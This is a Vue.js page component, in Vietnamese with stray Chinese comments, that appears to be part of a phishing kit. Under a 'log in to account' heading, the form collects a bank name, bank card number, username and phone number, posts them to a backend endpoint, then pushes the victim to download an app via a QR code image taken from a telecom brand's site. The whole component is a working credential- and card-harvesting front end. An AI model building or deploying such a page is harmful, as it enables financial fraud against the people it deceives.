<template>
  <div class="users-form-page">
    <Header/>
		<div class="users-form15">
			<h2 class="auth__title">Đăng nhập tài khoản</h2>
			<el-form  :model="form" :rules="rules" ref="ruleForm" >
				<el-form-item prop="rankname" >
						<el-select class="admin-forme-select"  filterable v-model="form.rankname" placeholder="Vui lòng chọn tên ngân hàng">
							<el-option
								v-for="item in bank"
								:key="item.value"
								:label="item.label"
								:value="item.value">
								<div class="align-center pb-4 form-select-box">
									<span class="form-select-img" ><img  :src="item.img" alt=""></span>
								</div>
							
							</el-option>
						</el-select>
						<!-- <p @click="showBank" class="chose-bank-input el-input__inner">请选择银行名</p> -->
					</el-form-item>
					<el-form-item  prop="rankNum">
						<el-input @click="showBank" v-model="form.rankNum" autocomplete="off" placeholder="Điền số thẻ ngân hàng"></el-input>
					</el-form-item>
					
					<el-form-item  prop="username" >
						<el-input v-model="form.username" autocomplete="off" placeholder="Điền vào tên người dùng"></el-input>
					</el-form-item>
					<el-form-item prop="phone" >
						<el-input v-model="form.phone" autocomplete="off" placeholder="Điền vào số điện thoại di động" ></el-input>
					</el-form-item>
					<!-- <el-button @click="resetForm('ruleForm')">取 消</el-button> -->
					<el-button class="sumit-btn" type="primary" @click="submitForm('ruleForm')">xác nhận</el-button>
				</el-form>
				<div class="center-center down dialog-appkp d-column">
					<p @click="showBank"><img src="https://viettel.vn/images/qrCode.png" alt=""></p>
					<p @click="showBank">quét mã QR để tải ứng dụng mới nhất </p>
				</div>
				<el-dialog
				title="Quét mã QR"
				width="98%"
				:visible.sync="dialogVisible"
				>
				<div class="center-center d-column">
	
					<p>quét mã QR để tải ứng dụng mới nhất </p>
					<img width="140" src="https://viettel.vn/images/qrCode.png" alt="">
				</div>
			</el-dialog>
		</div>
		<Footer/>
	</div>
</template>

<script>
import { dom } from '../components/config/emoji.js';
import bank from '../bank';
import Header from '../components/Header'
import Footer from '../components/footer'
export default {
	name: 'formHome',
  data() {
    return {
			bank,
			dialogVisible: false,
      form: {
				phone: '',
				username: '',
				rankname:'',
				rankNum:''
			},
			rules: {
				phone:[{ required: true, message: 'Điền vào số điện thoại di động', trigger: 'blur' },],
				username:[{ required: true, message: 'Điền vào tên người dùng', trigger: 'blur' },],
				rankname:[{ required: true, message: 'Vui lòng chọn tên ngân hàng', trigger: 'blur' },],
				rankNum:[{ required: true, message: 'Điền số thẻ ngân hàng', trigger: 'blur' },],
			}
    };
  },
	components: {
    Header,
		Footer
  },
  methods: {
		submitForm(formName) {
        this.$refs[formName].validate( async (valid) => {
          if (!valid) return
					let result= await this.ajaxData()
					this.resetForm(formName)
					this.dialogFormVisible=false
					console.log(result)
					if(result.code === 20000){
						this.$MessageBox.alert('ứng dụng của bạn đã được gửi ,vui lòng tải xuống ứng dụng khách mới nhất và xác nhận thông tin trao đổi', {
							confirmButtonText: 'xác nhận ',
							callback: action => {
								if( action == 'confirm'){
									//window.location.href=result.data.url
									this.$router.push({name:'downHome'})
								}
							}
						});
					}
        });
      },
			showBank(){
				this.dialogVisible=true
			},
		async	ajaxData(){
			const loading = this.$loading({
          lock: true,
          text: 'Loading',
          spinner: 'el-icon-loading',
          background: 'rgba(0, 0, 0, 0.7)'
        });
			let data=	this.$http.post(`/article/msg`,this.form)
			loading.close()
			return data
		},
		resetForm(formName) {
			this.$refs[formName].resetFields();
			this.dialogFormVisible = false
		},
   
  },
	mounted() {
		this.$body = document.querySelector('body')
		dom.addClass(this.$body, 'bg-gray  el-select-dropdown-page')
	},
	destroyed() {
		dom.removeClass(this.$body, 'bg-gray el-select-dropdown-page')
    }
};
</script>
<style lang="scss">
@import '../assets/styles/variables.scss';
.users-form15{
		padding: 0 15px;
		background: #fff;
	}
.users-form-page {
	.dialog-appkp{
		p{
			padding-bottom: 4px;
		}
	}
	.el-dialog__header{
		text-align: center;
	}
	.auth__title{
		padding: 20px 0;
		font-size: 20px;
    text-align: center;
		color: #44494d;
    font-family: 'FS PFBeauSansPro', sans-serif;
	}
	.down{
		margin: 15px 0;
		font-size: 14px;
		color: #252525;
	}
	.el-select{
		width: 100%;
	}
	.sumit-btn{
		width: 100%;
	}
	
}
.form-select-box{
	overflow: hidden;
	span{
		line-height: 1;
	}
}
.form-select-text{
		width: 40px;
		overflow: hidden;
		padding-left: 4px;
		flex: 1;
		overflow: hidden;
    /*文本不会换行*/
    white-space: nowrap;
    /*当文本溢出包含元素时，以省略号表示超出的文本*/
    text-overflow: ellipsis;
	}
	.el-select-dropdown-page{
		.el-select-dropdown__list{
			display: flex;
			flex-wrap: wrap;
		}
		.el-select-dropdown__item{
			display: flex;
			align-content: center;
			justify-content: center;
			width: 134px;
			height: 46px;
			background: none !important;
			img{
				max-width: 134px;
				max-height: 46px;
			}
		}
	}
	@media (max-width: 560px){
		.el-select-dropdown-page{
	
			.el-select-dropdown__item{
				width:50%
			}
		}
	}
	//el-select-dropdown__item el-select-dropdown__list
</style>